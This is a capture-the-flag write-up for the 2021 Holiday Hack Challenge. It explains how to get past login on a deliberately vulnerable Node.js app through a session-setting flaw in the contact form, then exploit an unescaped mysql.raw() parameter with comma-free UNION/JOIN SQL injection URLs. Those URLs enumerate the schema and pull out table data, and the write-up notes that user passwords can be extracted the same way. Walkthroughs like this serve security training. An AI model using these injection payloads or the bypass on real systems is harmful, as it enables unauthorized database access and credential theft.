(ch12)=
SQL Injection
=======================
(ch12_goal)=
## Goal
<b> In Jack Frost's TODO list, what job position does Jack plan to offer Santa?</b>

Ribb Bonbowford gives us some important clues about the assessment required to the Jack Frost Web service running at [(https://staging.jackfrosttower.com)](https://staging.jackfrosttower.com). 
It seems it is vulnerable to some SQL Injection.<br/>
He also gives us some useful docs: 
<br/>[(https://github.com/mysqljs/mysql)](https://github.com/mysqljs/mysql)
<br/>[(https://www.npmjs.com/package/express-session)](https://www.npmjs.com/package/express-session)

and last but not least, we have the entire source code [(here)](https://download.holidayhackchallenge.com/2021/frosttower-web.zip)
<br/>

## API list
First of all, let's grab a menu from the source code we have been kindly given.
```
get  ('/', function(req, res, next) {

get  ('/adduser', function(req, res, next){          // if (session.uniqueID){ (AND session.userstatus == 1 or redir dashboard)
post ('/adduser', function(req, res, next) {         // if (session.uniqueID){ (AND session.userstatus == 1 or redir dashboard)
 
get  ('/contact', function(req, res, next){

get  ('/dashboard', function(req, res, next){        // if (session.uniqueID){
post ('/delete/:id', function(req, res, next){       // if (session.uniqueID)    AND session.userstatus == 1  ... 
get  ('/detail/:id', function(req, res, next) {      // if (session.uniqueID){
 
get  ('/edit/:id', function(req, res, next) {        // if (session.uniqueID){
post ('/edit/:id', function(req, res, next){         // if (session.uniqueID){  ....... session.uniqueID = fullname  :)
post ('/export', function(req, res, next){           // if (session.uniqueID){

get  ('/forgotpass', function(req, res){
post ('/forgotpass', function(req, res, next){
get  ('/forgotpass/token/:id', function(req, res, next) {
post ('/forgotpass/token/:id', function(req, res, next) {

get  ('/login', function(req, res){
post ('/login', function(req, res, next){             // session.uniqueID = req.body.username
get  ('/logout', function(req, res){

post ('/postcontact', function(req, res, next){      // if (rowlength >= "1"){
                                                            session = req.session;
                                                            session.uniqueID = email;

get  ('/redirect', function(req, res){               // if (session.uniqueID){ 
 
get  ('/search', function(req, res, next) {          // if (session.uniqueID){
post ('/search', function(req, res, next) {          // if (session.uniqueID){

get  ('/useredit/:id', function(req, res, next) {    // if (session.uniqueID)    AND session.userstatus == 1 ... 
post ('/useredit/:id', function(req, res, next) {    // if (session.uniqueID)    AND session.userstatus == 1 ...
get  ('/userlist', function(req, res, next){         // if (session.uniqueID)    AND session.userstatus == 1 ...
post ('/userdelete/:id', function(req, res, next){   // if (session.uniqueID)    AND session.userstatus == 1 ...

get  ('/testsite', function(req, res, next) {
post ('/testsite', function(req, res, next){
```

## Sessions

It seems that by trying to access those endpoints we always receive the request of a login. 
<br />First thing to do is to view how the login works then. 
<br/>
The entrypoint that got our attention is the /postcontact, let's have a look: 
```
app.post('/postcontact', function(req, res, next){
    var fullname = xss( req.body.fullname );
    var email = xss(  req.body.email );
    var phone = xss( req.body.phone );
    var country = xss( req.body.country  );
    var date = new Date();
    var d = date.getDate();
    var mo = date.getMonth();
    var yr = date.getFullYear();
    var current_hour = date.getHours();
    var date_created = "2021-12-22 00:39:10";

    tempCont.query("SELECT * from uniquecontact where email="+tempCont.escape(email), function(error, rows, fields){

        if (error) {
            console.log(error);
            return res.sendStatus(500);
        }

        var rowlength = rows.length;
        if (rowlength >= "1"){
            session = req.session;
            session.uniqueID = email;          <===================== here, here, here!!!
            req.flash('info', 'Email Already Exists');
            res.redirect("/contact");

.........
```

It says that if we use (in the contact form) as email an email that was already inserted ... then 
we will obtain to populate the variabile `session.uniqueID` with that email string. This sounds good
because sometimes `session.uniqueID` is the only session var that is evaluated and that gives you authorization
access to further reserved pages (as you can notice in the code above). 
<br />

For sure, up to now, we know that: <br/>
inserting an email in the page index we populate the table: `emails`<br/>
inserting an email in the page contact we populate the table: `uniquecontact` (this is needed to bypass the login)
<br/>
we are able to access the endpoint: /dashboard  and to see all the values inserted in the `uniquecontact` table<br/>
we are able to access the endpoint: /detail/[integer]
<br/>
That's a good start!<br/>

## The SQL Injection Point

By analizing the source code in server.js we have to find some clue to discover where a sql injection is possible.
All the params are correctly escaped in every sqlstring .... except one. 
```
app.get('/detail/:id', function(req, res, next) {
    session = req.session;
    var reqparam = req.params['id'];
    var query = "SELECT * FROM uniquecontact WHERE id=";

    if (session.uniqueID){

        try {
            if (reqparam.indexOf(',') > 0){
                var ids = reqparam.split(',');
                reqparam = "0";
                for (var i=0; i<ids.length; i++){
                    query += tempCont.escape(m.raw(ids[i]));   // <======== possible SQL INJ !!!!!!
                    query += " OR id="
                }
                query += "?";
            }else{
                query = "SELECT * FROM uniquecontact WHERE id=?"
            }
        } catch (error) {
            console.log(error);
            return res.sendStatus(500);
        }
....
```
```{note}
from the [(doc)](https://github.com/mysqljs/mysql#escaping-query-values)<br/>
To generate objects with a toSqlString method, the mysql.raw() method can be used. This creates an object that will be left un-touched when using in a ? placeholder, useful for using functions as dynamic values:

<b>Caution:</b> The string provided to mysql.raw() will skip all escaping functions when used, so be careful when passing an unvalidated input.

```

After installing all the libs (node,npm,mariadb) required and downgraded the dateformat lib, we were able to have a local server
running the affected code. <br/>
Here we go, let's try a simple test
```
http://127.0.0.1:1155/detail/2,a1=2
```
we can see in the logs of the web service
```
code: 'ER_BAD_FIELD_ERROR',
  errno: 1054,
  sqlMessage: "Unknown column 'a1' in 'where clause'",
  sqlState: '42S22',
  index: 0,
  sql: "SELECT * FROM uniquecontact WHERE id=2 OR id=a1=2 OR id='0'"

```
so every parameters passed after a comma is appended to the column 'id' and concatenated to the where sql string (as of the code). 
<br/>Let's try with a UNION! ..... we have just 2 tables in our local db file with the same numbers of columns: users and uniquecontact  ;)
<br/>Do not forget that we have to insert some records in the users table first, otherwise we won't see anything!<br/>
```
http://127.0.0.1:1155/detail/2,2%20UNION%20SELECT%20*%20FROM%20users%20where%20id=id
```
## Template dateFormat error

```
TypeError: /app/webpage/detail.ejs:29
    27|                             -
    28|                         <% }else { %>
 >> 29|                             <%= dateFormat(encontact.date_update, "mmmm dS, yyyy h:MM:ss") %>
    30|                         <% } %>                     
    31|                         </li>
    32|                     </ul>

Invalid date
    at Object.dateFormat (/app/node_modules/dateformat/lib/dateformat.js:39:17)
    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:45:26)
    at Array.forEach (<anonymous>)
    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:21:18)
    at returnedFn (/app/node_modules/ejs/lib/ejs.js:653:17)
    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:251:36)
    at View.exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:482:10)
    at View.render (/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/app/node_modules/express/lib/application.js:640:10)
    at Function.render (/app/node_modules/express/lib/application.js:592:3)
```

## First Contstraint

This error was totally unexpected! ... A dateFormat error here?<br/> 
Yes, because we need to extract exactly two Date as the 2 last columns. <br/>

## Second Contstraint

By re-analyzing the piece of code, it turns out clearly a second constraint also:<br/>
we cannot use any comma in our UNION sql injection !!!!!!   =:-0<br/>

Do you remember? Every comma in the url will mess up with the concatenation of the params in the sql query!
<br />

## Recap
we have to execute a UNION without using commas for the second query .... mmmmhhhh<br />
After diving into it and some extra tests ... we found the solution by using the JOIN ! :)

## The SQL 
[(here it is our super query)](https://staging.jackfrosttower.com/detail/2,3%20UNION%20SELECT%20*%20FROM%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20'encontact')%20as%20q1%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20'encontact')as%20q2%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20'encontact')as%20q3%20join%20(SELECT%20TABLE_NAME%20from%20information_schema.tables%20WHERE%20table_schema%20=%20'encontact')as%20q4%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20'encontact')as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=33)as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=33)as%20q7%20where%201=1%20--) <br/>

Yep! it works!<br />
And from there we can see there is a new table in the database: the TODO table,
so we are near to our goal: <b>[Goal](ch12_goal)</b>
<br/>

## others SQL

We still have to do just two query:<br/> 
1- to the information.schema COLUMNS in order to know the fields of the new TODO table<br/>
2- extract the date from the TODO table<br/>


<a href="https://staging.jackfrosttower.com/detail/1,3%20UNION%20SELECT%20*%20FROM%20(%20SELECT%20null%20)%20as%20q1%20join%20(SELECT%20null%20)%20as%20q2%20join%20(SELECT%20null%20)%20as%20q3%20join%20(SELECT%20null%20)%20as%20q4%20join%20(SELECT%20COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA%20=%20'encontact'%20AND%20TABLE_NAME%20=%20'todo'%20)%20as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q7%20--)">query information schema</a>
<br />
<a href="https://staging.jackfrosttower.com/detail/1,3%20UNION%20SELECT%20*%20FROM%20(%20SELECT%20null%20)%20as%20q1%20join%20(SELECT%20null%20)%20as%20q2%20join%20(SELECT%20null%20)%20as%20q3%20join%20(SELECT%20null%20)%20as%20q4%20join%20(SELECT%20note%20FROM%20todo)%20as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q7%20%E2%80%93)">query SELECT from TODO</a>


and finally, here are the values of the tremendous Frosty's TODO list
```
    Buy up land all around Santa's Castle
    Build bigger and more majestic tower next to Santa's
    Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
    Dishearten Santa's elves and encourage defection to our cause
    Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
    Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
    Force Santa to cancel Christmas
    SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
    With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him

```
Done!


## Little Appendix:

How the UNION worked? Here is an example of the schema we used 
```
select * FROM ( SELECT null ) as q1
    join (SELECT null ) as q2
    join (SELECT null ) as q3
    join (SELECT note FROM todo) as q4
    join (SELECT null ) as q5
    join (SELECT date_created FROM uniquecontact WHERE id=33) as q6
    join (SELECT date_update FROM uniquecontact WHERE id=33) as q7 --
```
You can use q1, q2,q3, q4 or q5 and execute whatever SELECT you can need. 
<br/>You just cannot use q6 and q7 because they are reserved for displaying only datetime fields.

And here the example of UNION of the table uniquecontact and users.<br/> 
we can imagine the resulting table like this
```
+----+-----------+------------+---------+-----------------+----------------------+---------------------+
| id | full_name | email      |   phone |   country       | date_created         | date_update         |
+----+-----------+------------+---------+-----------------+----------------------+---------------------+
| 33 | da1       | da@me.it   | 11111   |  Bouvet Island  | 2021-12-22 00:39:10  | 2021-12-30 22:12:22 |
| 10 | test_user | test@me.it | superpwd|  1              | 2021-12-22 00:39:10  | 2021-12-30 22:12:22 |
+----+-----------+------------+---------+-----------------+----------------------+---------------------+

```
In this case, the user's password appears in the field 'phone' because in an UNION the fields on the left table win and are the only name displayed. 
<br/>
